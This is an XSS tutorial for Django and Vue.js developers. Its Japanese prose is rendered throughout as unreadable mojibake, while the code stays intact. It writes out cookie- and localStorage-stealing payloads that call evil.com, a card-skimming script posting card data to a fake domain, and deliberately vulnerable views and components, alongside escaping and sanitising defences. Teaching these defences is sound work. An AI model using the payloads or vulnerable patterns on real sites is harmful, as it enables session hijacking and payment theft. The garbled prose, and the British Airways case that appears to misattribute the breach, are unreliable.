# XSS (Cross-Site Scripting) æ”»æ’ƒå®Œå…¨ã‚¬ã‚¤ãƒ‰ ğŸ›¡ï¸

## ç›®æ¬¡
1. [XSSã¨ã¯ï¼ŸSQLã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³ã¨ã®é•ã„](#xssã¨ã¯sqlã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³ã¨ã®é•ã„)
2. [XSSã®3ã¤ã®ã‚¿ã‚¤ãƒ—](#xssã®3ã¤ã®ã‚¿ã‚¤ãƒ—)
3. [å®Ÿéš›ã®æ”»æ’ƒä¾‹ã¨ã‚³ãƒ¼ãƒ‰](#å®Ÿéš›ã®æ”»æ’ƒä¾‹ã¨ã‚³ãƒ¼ãƒ‰)
4. [Django + Vue.jsã§ã®é˜²å¾¡æ–¹æ³•](#django--vuejsã§ã®é˜²å¾¡æ–¹æ³•)
5. [å±é™ºãªã‚³ãƒ¼ãƒ‡ã‚£ãƒ³ã‚°ãƒ‘ã‚¿ãƒ¼ãƒ³](#å±é™ºãªã‚³ãƒ¼ãƒ‡ã‚£ãƒ³ã‚°ãƒ‘ã‚¿ãƒ¼ãƒ³)
6. [ã‚ãªãŸã®ã‚¢ãƒ—ãƒªã®å®‰å…¨æ€§ãƒã‚§ãƒƒã‚¯](#ã‚ãªãŸã®ã‚¢ãƒ—ãƒªã®å®‰å…¨æ€§ãƒã‚§ãƒƒã‚¯)

---

## XSSã¨ã¯ï¼ŸSQLã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³ã¨ã®é•ã„

### æ”»æ’ƒå¯¾è±¡ã®é•ã„

```
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚              SQLã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³ vs XSS                     â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜

SQLã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³:
  æ”»æ’ƒå¯¾è±¡ â†’ ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ï¼ˆã‚µãƒ¼ãƒãƒ¼å´ï¼‰
  æ”»æ’ƒè€…   â†’ ã‚µãƒ¼ãƒãƒ¼ã‚’ç›´æ¥æ”»æ’ƒ
  
  ä¾‹ï¼š
  username = "admin' OR '1'='1"
  â†“
  SELECT * FROM users WHERE username='admin' OR '1'='1'
  â†“
  ã™ã¹ã¦ã®ãƒ¦ãƒ¼ã‚¶ãƒ¼æƒ…å ±ãŒæ¼æ´© ğŸ’¥

XSS (Cross-Site Scripting):
  æ”»æ’ƒå¯¾è±¡ â†’ ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®ãƒ–ãƒ©ã‚¦ã‚¶ï¼ˆã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆå´ï¼‰
  æ”»æ’ƒè€…   â†’ æ­£è¦ã‚µã‚¤ãƒˆã‚’çµŒç”±ã—ã¦ãƒ¦ãƒ¼ã‚¶ãƒ¼ã‚’æ”»æ’ƒ
  
  ä¾‹ï¼š
  comment = "<script>alert('XSS')</script>"
  â†“
  ãƒ–ãƒ©ã‚¦ã‚¶ãŒå®Ÿè¡Œ
  â†“
  Cookieç›—é›£ã€ã‚»ãƒƒã‚·ãƒ§ãƒ³ä¹—ã£å–ã‚Š ğŸ’¥
```

### é‡è¦ãªé•ã„

| é …ç›® | SQLã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³ | XSS |
|-----|-------------------|-----|
| **æ”»æ’ƒå ´æ‰€** | ã‚µãƒ¼ãƒãƒ¼ï¼ˆãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ï¼‰ | ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆï¼ˆãƒ–ãƒ©ã‚¦ã‚¶ï¼‰ |
| **æ”»æ’ƒã‚¿ã‚¤ãƒŸãƒ³ã‚°** | ãƒªã‚¯ã‚¨ã‚¹ãƒˆæ™‚ | ãƒšãƒ¼ã‚¸è¡¨ç¤ºæ™‚ |
| **å½±éŸ¿ç¯„å›²** | ã‚µãƒ¼ãƒãƒ¼ãƒ‡ãƒ¼ã‚¿å…¨ä½“ | å€‹ã€…ã®ãƒ¦ãƒ¼ã‚¶ãƒ¼ |
| **ä¸»ãªè¢«å®³** | ãƒ‡ãƒ¼ã‚¿æ¼æ´©ã€æ”¹ã–ã‚“ | Cookieç›—é›£ã€ãªã‚Šã™ã¾ã— |
| **å…¥åŠ›å ´æ‰€** | ä¸»ã«ãƒ•ã‚©ãƒ¼ãƒ  | ãƒ•ã‚©ãƒ¼ãƒ ã€URLã€Cookieç­‰ |

---

## XSSã®3ã¤ã®ã‚¿ã‚¤ãƒ—

### Type 1: Stored XSS (ä¿å­˜å‹) - æœ€ã‚‚å±é™ºï¼

**ç‰¹å¾´:** æ‚ªæ„ã‚ã‚‹ã‚¹ã‚¯ãƒªãƒ—ãƒˆãŒãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ãªã©ã‚µãƒ¼ãƒãƒ¼ã«æ°¸ç¶šçš„ã«ä¿å­˜ã•ã‚Œã€ä»–ã®ãƒ¦ãƒ¼ã‚¶ãƒ¼ãŒãã®ãƒ‡ãƒ¼ã‚¿ã‚’å–å¾—ã—ãŸéš›ã«å®Ÿè¡Œã•ã‚Œã‚‹

```
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚              Stored XSS æ”»æ’ƒãƒ•ãƒ­ãƒ¼                          â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜

ã‚¹ãƒ†ãƒƒãƒ—1: æ”»æ’ƒè€…ãŒæ‚ªæ„ã‚ã‚‹ã‚³ãƒ¡ãƒ³ãƒˆã‚’æŠ•ç¨¿
  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
  â”‚  æ”»æ’ƒè€…      â”‚
  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
         â”‚
         â”‚ POST /api/comments/
         â”‚ {
         â”‚   "text": "<script>
         â”‚     fetch('https://evil.com/steal?cookie=' 
         â”‚       + document.cookie)
         â”‚   </script>"
         â”‚ }
         â–¼
  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
  â”‚   Django    â”‚ â† âš ï¸ ã‚µãƒ‹ã‚¿ã‚¤ã‚ºãªã—ã§ä¿å­˜
  â”‚  Database   â”‚
  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜

ã‚¹ãƒ†ãƒƒãƒ—2: è¢«å®³è€…ãŒãƒšãƒ¼ã‚¸ã‚’é–²è¦§
  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
  â”‚  è¢«å®³è€…      â”‚
  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
         â”‚
         â”‚ GET /comments/
         â–¼
  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
  â”‚   Django    â”‚ â† ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ã‹ã‚‰å–å¾—
  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
         â”‚
         â”‚ 200 OK
         â”‚ <div class="comment">
         â”‚   <script>
         â”‚     fetch('https://evil.com/steal?cookie=' 
         â”‚       + document.cookie)  â† ã“ã‚ŒãŒå®Ÿè¡Œã•ã‚Œã‚‹ï¼
         â”‚   </script>
         â”‚ </div>
         â–¼
  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
  â”‚ è¢«å®³è€…ã®     â”‚
  â”‚ ãƒ–ãƒ©ã‚¦ã‚¶    â”‚ â† ã‚¹ã‚¯ãƒªãƒ—ãƒˆå®Ÿè¡Œ
  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
         â”‚
         â”‚ è¢«å®³è€…ã®CookieãŒæ”»æ’ƒè€…ã«é€ä¿¡ï¼
         â–¼
  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
  â”‚ æ”»æ’ƒè€…ã®     â”‚
  â”‚ ã‚µãƒ¼ãƒãƒ¼    â”‚ â† ã‚»ãƒƒã‚·ãƒ§ãƒ³ä¹—ã£å–ã‚ŠæˆåŠŸ ğŸ’¥
  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜

å½±éŸ¿: ã™ã¹ã¦ã®é–²è¦§è€…ãŒè¢«å®³ã‚’å—ã‘ã‚‹
å±é™ºåº¦: â˜…â˜…â˜…â˜…â˜… (æœ€é«˜)
```

**å®Ÿéš›ã®æ”»æ’ƒä¾‹:**

```html
<!-- æ²ç¤ºæ¿ã®ã‚³ãƒ¡ãƒ³ãƒˆæ¬„ã«æŠ•ç¨¿ -->
ã“ã‚“ã«ã¡ã¯ï¼<img src="x" onerror="
  var img = new Image();
  img.src = 'https://evil.com/steal.php?c=' + document.cookie;
">
```

### Type 2: Reflected XSS (åå°„å‹)

**ç‰¹å¾´:** ãƒ¦ãƒ¼ã‚¶ãƒ¼ãŒæä¾›ã—ãŸãƒ‡ãƒ¼ã‚¿ãŒå³åº§ã«ãƒ¬ã‚¹ãƒãƒ³ã‚¹ã«åæ˜ ã•ã‚Œã€é©åˆ‡ãªæ¤œè¨¼ãªã—ã«å®Ÿè¡Œã•ã‚Œã‚‹ã€‚é€šå¸¸ã¯URLãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ã‚’åˆ©ç”¨ã€‚

```
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚            Reflected XSS æ”»æ’ƒãƒ•ãƒ­ãƒ¼                         â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜

ã‚¹ãƒ†ãƒƒãƒ—1: æ”»æ’ƒè€…ãŒç½ URLã‚’ä½œæˆ
  https://yoursite.com/search?q=<script>alert(document.cookie)</script>

ã‚¹ãƒ†ãƒƒãƒ—2: æ”»æ’ƒè€…ãŒURLã‚’é…å¸ƒï¼ˆãƒ¡ãƒ¼ãƒ«ã€SNSç­‰ï¼‰
  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
  â”‚  æ”»æ’ƒè€…      â”‚ "ç„¡æ–™ã‚¯ãƒ¼ãƒãƒ³ã¯ã“ã¡ã‚‰ï¼"
  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â†“ ï¼ˆç½ URLã‚’é€ä¿¡ï¼‰
         â”‚
         â–¼
  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
  â”‚  è¢«å®³è€…      â”‚ ã‚¯ãƒªãƒƒã‚¯
  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜

ã‚¹ãƒ†ãƒƒãƒ—3: ã‚µãƒ¼ãƒãƒ¼ãŒãã®ã¾ã¾åæ˜ 
  GET /search?q=<script>alert(document.cookie)</script>
         â”‚
         â–¼
  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
  â”‚   Django    â”‚
  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
         â”‚
         â”‚ 200 OK
         â”‚ <h1>æ¤œç´¢çµæœ: <script>alert(document.cookie)</script></h1>
         â”‚              â†‘ ãã®ã¾ã¾åŸ‹ã‚è¾¼ã¾ã‚Œã‚‹
         â–¼
  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
  â”‚ è¢«å®³è€…ã®     â”‚
  â”‚ ãƒ–ãƒ©ã‚¦ã‚¶    â”‚ â† ã‚¹ã‚¯ãƒªãƒ—ãƒˆå®Ÿè¡Œï¼ğŸ’¥
  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜

å½±éŸ¿: URLã‚’ã‚¯ãƒªãƒƒã‚¯ã—ãŸäººã®ã¿
å±é™ºåº¦: â˜…â˜…â˜…â˜†â˜†
```

**å®Ÿéš›ã®æ”»æ’ƒä¾‹:**

```python
# Django Viewï¼ˆè„†å¼±ãªä¾‹ï¼‰
def search(request):
    query = request.GET.get('q', '')
    # âš ï¸ å±é™ºï¼šãã®ã¾ã¾HTMLã«åŸ‹ã‚è¾¼ã¿
    return HttpResponse(f"<h1>æ¤œç´¢çµæœ: {query}</h1>")

# æ”»æ’ƒURL
# /search?q=<img src=x onerror="location='https://evil.com?c='+document.cookie">
```

### Type 3: DOM-based XSS (DOMå‹)

**ç‰¹å¾´:** ã‚µãƒ¼ãƒãƒ¼ã‚’çµŒç”±ã›ãšã€ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆå´ã®JavaScriptã§DOMæ“ä½œã™ã‚‹éš›ã«ç™ºç”Ÿã€‚

```
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚            DOM-based XSS æ”»æ’ƒãƒ•ãƒ­ãƒ¼                         â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜

æ”»æ’ƒURL: https://yoursite.com#<img src=x onerror="alert(1)">

  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
  â”‚  è¢«å®³è€…      â”‚ URLã‚’ã‚¯ãƒªãƒƒã‚¯
  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
         â”‚
         â”‚ GET /page#<img src=x onerror="alert(1)">
         â–¼
  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
  â”‚   Django    â”‚ â† ã‚µãƒ¼ãƒãƒ¼ã¯ç„¡é–¢ä¿‚
  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜    (#ä»¥é™ã¯ã‚µãƒ¼ãƒãƒ¼ã«é€ä¿¡ã•ã‚Œãªã„)
         â”‚
         â”‚ 200 OK (é€šå¸¸ã®HTML)
         â”‚ <script>
         â”‚   // location.hashã‚’ä½¿ç”¨
         â”‚   document.write(location.hash.substring(1));
         â”‚ </script>
         â–¼
  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
  â”‚ ãƒ–ãƒ©ã‚¦ã‚¶     â”‚
  â”‚ JavaScript  â”‚
  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
         â”‚
         â”‚ location.hash = "<img src=x onerror='alert(1)'>"
         â”‚ document.write("<img src=x onerror='alert(1)'>")
         â–¼
      ã‚¹ã‚¯ãƒªãƒ—ãƒˆå®Ÿè¡Œï¼ğŸ’¥

ç‰¹å¾´: ã‚µãƒ¼ãƒãƒ¼ã¯é–¢ä¸ã—ãªã„ï¼ˆãƒ­ã‚°ã«ã‚‚æ®‹ã‚‰ãªã„ï¼‰
å±é™ºåº¦: â˜…â˜…â˜…â˜…â˜†
```

**è„†å¼±ãªã‚³ãƒ¼ãƒ‰ä¾‹ï¼ˆVue.jsï¼‰:**

```javascript
// âš ï¸ å±é™ºãªVue.jsã‚³ãƒ¼ãƒ‰
export default {
  mounted() {
    // URLã®ãƒãƒƒã‚·ãƒ¥éƒ¨åˆ†ã‚’ç›´æ¥DOMã«æŒ¿å…¥
    const hash = window.location.hash.substring(1);
    document.getElementById('content').innerHTML = hash;  // å±é™ºï¼
  }
}

// æ”»æ’ƒURL
// /#<img src=x onerror="fetch('https://evil.com?c='+document.cookie)">
```

---

## å®Ÿéš›ã®æ”»æ’ƒä¾‹ã¨ã‚³ãƒ¼ãƒ‰

### äº‹ä¾‹1: British Airways (2018å¹´)

2018å¹´ã€British Airwaysã¯Magecartã¨ã„ã†æ”»æ’ƒã‚°ãƒ«ãƒ¼ãƒ—ã«ã‚ˆã‚Šæ”»æ’ƒã•ã‚Œã€ã‚µã‚¤ãƒˆã§ä½¿ç”¨ã•ã‚Œã¦ã„ãŸFeedifyã¨ã„ã†JavaScriptãƒ©ã‚¤ãƒ–ãƒ©ãƒªã®XSSè„†å¼±æ€§ãŒæ‚ªç”¨ã•ã‚Œã¾ã—ãŸã€‚æ”»æ’ƒè€…ã¯ã‚¹ã‚¯ãƒªãƒ—ãƒˆã‚’æ”¹å¤‰ã—ã€é¡§å®¢ãƒ‡ãƒ¼ã‚¿ã‚’æ‚ªæ„ã‚ã‚‹ã‚µãƒ¼ãƒãƒ¼ã«é€ä¿¡ã™ã‚‹ã‚ˆã†ä»•çµ„ã¿ã¾ã—ãŸã€‚

```javascript
// æ”»æ’ƒã•ã‚ŒãŸã‚³ãƒ¼ãƒ‰ï¼ˆç°¡ç•¥ç‰ˆï¼‰
<script src="https://feedify.example.com/widget.js"></script>

// æ”¹ã–ã‚“å¾Œ
<script src="https://feedify.example.com/widget.js"></script>
<script>
  // æ”»æ’ƒè€…ãŒæ³¨å…¥ã—ãŸã‚³ãƒ¼ãƒ‰
  document.addEventListener('submit', function(e) {
    var formData = new FormData(e.target);
    // ã‚¯ãƒ¬ã‚¸ãƒƒãƒˆã‚«ãƒ¼ãƒ‰æƒ…å ±ã‚’ç›—ã‚€
    fetch('https://ba-analytics.com/collect', {  // å½ãƒ‰ãƒ¡ã‚¤ãƒ³
      method: 'POST',
      body: JSON.stringify({
        card: formData.get('card_number'),
        cvv: formData.get('cvv'),
        name: formData.get('cardholder_name')
      })
    });
  });
</script>
```

**è¢«å®³:** ç´„38ä¸‡äººã®é¡§å®¢æƒ…å ±ãŒæ¼æ´©

### äº‹ä¾‹2: eBay (2015-2016å¹´)

eBayã«ã¯URLãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ã‚’æ¤œè¨¼ã—ãªã„XSSè„†å¼±æ€§ãŒã‚ã‚Šã¾ã—ãŸã€‚æ”»æ’ƒè€…ã¯æ‚ªæ„ã‚ã‚‹ã‚³ãƒ¼ãƒ‰ã‚’ãƒšãƒ¼ã‚¸ã«æ³¨å…¥ã§ãã€eBayã®è²©å£²è€…ã‚¢ã‚«ã‚¦ãƒ³ãƒˆã¸ã®ãƒ•ãƒ«ã‚¢ã‚¯ã‚»ã‚¹ã‚’å–å¾—ã—ã€å•†å“ã‚’å‰²å¼•ä¾¡æ ¼ã§è²©å£²ã—ãŸã‚Šæ±ºæ¸ˆæƒ…å ±ã‚’ç›—ã‚“ã ã‚Šã—ã¾ã—ãŸã€‚

```javascript
// è„†å¼±ãªã‚³ãƒ¼ãƒ‰
// /redirect?url=<æ”»æ’ƒã‚³ãƒ¼ãƒ‰>

// æ”»æ’ƒURL
https://ebay.com/redirect?url=javascript:void(
  document.location='https://evil.com/phishing?user='+document.cookie
)
```

### äº‹ä¾‹3: Cookieç›—é›£ã®å…¸å‹ä¾‹

```html
<!-- æ²ç¤ºæ¿ã®ã‚³ãƒ¡ãƒ³ãƒˆæ¬„ -->
ç´ æ™´ã‚‰ã—ã„è¨˜äº‹ã§ã™ã­ï¼
<img src="invalid-url" onerror="
  // Cookieã‚’ç›—ã‚€
  var cookies = document.cookie;
  var img = new Image();
  img.src = 'https://evil.com/steal.php?data=' + encodeURIComponent(cookies);
">

<!-- ã¾ãŸã¯ -->
<script>
  // ã‚ˆã‚Šé«˜åº¦ãªæ”»æ’ƒ
  fetch('https://evil.com/api/steal', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({
      cookie: document.cookie,
      localStorage: localStorage,
      url: location.href,
      userAgent: navigator.userAgent
    })
  });
</script>
```

---

## Django + Vue.jsã§ã®é˜²å¾¡æ–¹æ³•

### Djangoå´ã®é˜²å¾¡ï¼ˆãƒãƒƒã‚¯ã‚¨ãƒ³ãƒ‰ï¼‰

#### 1. è‡ªå‹•ã‚¨ã‚¹ã‚±ãƒ¼ãƒ—ï¼ˆãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã§æœ‰åŠ¹ï¼‰âœ…

Djangoãƒ†ãƒ³ãƒ—ãƒ¬ãƒ¼ãƒˆã‚¨ãƒ³ã‚¸ãƒ³ã¯ã€è‡ªå‹•çš„ã«ã™ã¹ã¦ã®å¤‰æ•°ã‚¿ã‚°ã®å‡ºåŠ›ã‚’ã‚¨ã‚¹ã‚±ãƒ¼ãƒ—ã—ã¾ã™ã€‚å…·ä½“çš„ã«ã¯Pythonã®html.escape()é–¢æ•°ã‚’ä½¿ç”¨ã—ã€&ã‚’&amp;ã€<ã¨>ã‚’&lt;ã¨&gt;ã€"ã‚’&quot;ã€'ã‚’&#x27;ã«ç½®ãæ›ãˆã¾ã™ã€‚

```python
# views.py
from django.shortcuts import render

def comment_view(request):
    comment = request.GET.get('text', '')
    # commentãŒ "<script>alert('XSS')</script>" ã ã¨ã—ã¦ã‚‚...
    return render(request, 'comment.html', {'comment': comment})

# comment.html
<div class="comment">
  {{ comment }}  <!-- è‡ªå‹•çš„ã«ã‚¨ã‚¹ã‚±ãƒ¼ãƒ—ã•ã‚Œã‚‹ âœ… -->
</div>

# ãƒ¬ãƒ³ãƒ€ãƒªãƒ³ã‚°çµæœ
<div class="comment">
  &lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;
</div>

# ãƒ–ãƒ©ã‚¦ã‚¶è¡¨ç¤ºï¼ˆãƒ†ã‚­ã‚¹ãƒˆã¨ã—ã¦è¡¨ç¤ºï¼‰
<script>alert('XSS')</script>
```

#### 2. å±é™ºãªãƒ‘ã‚¿ãƒ¼ãƒ³ã‚’é¿ã‘ã‚‹

```python
# âŒ å±é™ºï¼šHttpResponseã‚’ç›´æ¥ä½¿ç”¨
from django.http import HttpResponse

def search(request):
    query = request.GET.get('q', '')
    return HttpResponse(f"<h1>æ¤œç´¢: {query}</h1>")  # XSSè„†å¼±æ€§ï¼

# âœ… å®‰å…¨ï¼šrenderã‚’ä½¿ç”¨
from django.shortcuts import render

def search(request):
    query = request.GET.get('q', '')
    return render(request, 'search.html', {'query': query})

# search.html
<h1>æ¤œç´¢: {{ query }}</h1>  <!-- è‡ªå‹•ã‚¨ã‚¹ã‚±ãƒ¼ãƒ— âœ… -->
```

#### 3. mark_safe()ã¯æ…é‡ã«ä½¿ã†

```python
# âŒ å±é™º
from django.utils.safestring import mark_safe

def display_html(request):
    user_html = request.POST.get('html', '')
    safe_html = mark_safe(user_html)  # XSSè„†å¼±æ€§ï¼
    return render(request, 'page.html', {'content': safe_html})

# âœ… å®‰å…¨ï¼šã‚µãƒ‹ã‚¿ã‚¤ã‚ºã—ã¦ã‹ã‚‰ä½¿ç”¨
import bleach

def display_html(request):
    user_html = request.POST.get('html', '')
    # è¨±å¯ã™ã‚‹ã‚¿ã‚°ã®ã¿æ®‹ã™
    clean_html = bleach.clean(
        user_html,
        tags=['p', 'strong', 'em', 'u', 'a'],
        attributes={'a': ['href', 'title']},
        strip=True
    )
    safe_html = mark_safe(clean_html)
    return render(request, 'page.html', {'content': safe_html})
```

#### 4. DRF (Django REST Framework)

```python
# DRFã¯JSONã‚’è¿”ã™ãŸã‚ã€åŸºæœ¬çš„ã«å®‰å…¨
from rest_framework.views import APIView
from rest_framework.response import Response

class CommentAPI(APIView):
    def get(self, request):
        comment = request.query_params.get('text', '')
        # JSONã¨ã—ã¦è¿”ã™ãŸã‚ã€ãƒ–ãƒ©ã‚¦ã‚¶ãŒå®Ÿè¡Œã—ãªã„ âœ…
        return Response({'comment': comment})

# ãƒ¬ã‚¹ãƒãƒ³ã‚¹
{
  "comment": "<script>alert('XSS')</script>"
}

# ã“ã®ã¾ã¾ã§ã¯ã‚¹ã‚¯ãƒªãƒ—ãƒˆã¯å®Ÿè¡Œã•ã‚Œãªã„ï¼
# ãƒ•ãƒ­ãƒ³ãƒˆã‚¨ãƒ³ãƒ‰ï¼ˆVue.jsï¼‰ã§é©åˆ‡ã«å‡¦ç†ã™ã‚‹å¿…è¦ãŒã‚ã‚‹
```

### Vue.jså´ã®é˜²å¾¡ï¼ˆãƒ•ãƒ­ãƒ³ãƒˆã‚¨ãƒ³ãƒ‰ï¼‰

#### 1. ãƒ†ãƒ³ãƒ—ãƒ¬ãƒ¼ãƒˆå†…ã§ã¯è‡ªå‹•ã‚¨ã‚¹ã‚±ãƒ¼ãƒ— âœ…

```vue
<!-- âœ… å®‰å…¨ï¼šVueã¯è‡ªå‹•çš„ã«ã‚¨ã‚¹ã‚±ãƒ¼ãƒ— -->
<template>
  <div>
    <p>{{ userComment }}</p>  <!-- è‡ªå‹•ã‚¨ã‚¹ã‚±ãƒ¼ãƒ— -->
  </div>
</template>

<script setup>
import { ref } from 'vue';

const userComment = ref('<script>alert("XSS")</script>');
// è¡¨ç¤ºçµæœï¼ˆãƒ†ã‚­ã‚¹ãƒˆã¨ã—ã¦è¡¨ç¤ºï¼‰:
// <script>alert("XSS")</script>
</script>
```

#### 2. v-html ã¯çµ¶å¯¾ã«é¿ã‘ã‚‹ï¼ˆãƒ¦ãƒ¼ã‚¶ãƒ¼å…¥åŠ›ã®å ´åˆï¼‰

```vue
<!-- âŒ è¶…å±é™ºï¼šv-htmlã¯ã‚¨ã‚¹ã‚±ãƒ¼ãƒ—ã—ãªã„ -->
<template>
  <div>
    <div v-html="userComment"></div>  <!-- XSSè„†å¼±æ€§ï¼ -->
  </div>
</template>

<script setup>
import { ref } from 'vue';

const userComment = ref('<img src=x onerror="alert(document.cookie)">');
// ã“ã®ã‚¹ã‚¯ãƒªãƒ—ãƒˆãŒå®Ÿè¡Œã•ã‚Œã‚‹ï¼ğŸ’¥
</script>

<!-- âœ… ã©ã†ã—ã¦ã‚‚ä½¿ã†å ´åˆã¯ã‚µãƒ‹ã‚¿ã‚¤ã‚º -->
<script setup>
import { ref, computed } from 'vue';
import DOMPurify from 'dompurify';

const userComment = ref('<p>å®‰å…¨ãªHTML</p><script>alert("XSS")</script>');

const sanitizedComment = computed(() => {
  return DOMPurify.sanitize(userComment.value);
});
</script>

<template>
  <div v-html="sanitizedComment"></div>  <!-- ã‚µãƒ‹ã‚¿ã‚¤ã‚ºæ¸ˆã¿ âœ… -->
</template>
```

#### 3. DOMæ“ä½œã¯é¿ã‘ã‚‹

```javascript
// âŒ å±é™ºï¼šç›´æ¥DOMæ“ä½œ
mounted() {
  const userInput = this.$route.query.name;
  document.getElementById('greeting').innerHTML = 
    `ã“ã‚“ã«ã¡ã¯ã€${userInput}ã•ã‚“ï¼`;  // XSSè„†å¼±æ€§ï¼
}

// âœ… å®‰å…¨ï¼šVueã®ãƒ†ãƒ³ãƒ—ãƒ¬ãƒ¼ãƒˆã‚’ä½¿ç”¨
<template>
  <div id="greeting">ã“ã‚“ã«ã¡ã¯ã€{{ userName }}ã•ã‚“ï¼</div>
</template>

<script setup>
import { ref } from 'vue';
import { useRoute } from 'vue-router';

const route = useRoute();
const userName = ref(route.query.name || 'ã‚²ã‚¹ãƒˆ');
</script>
```

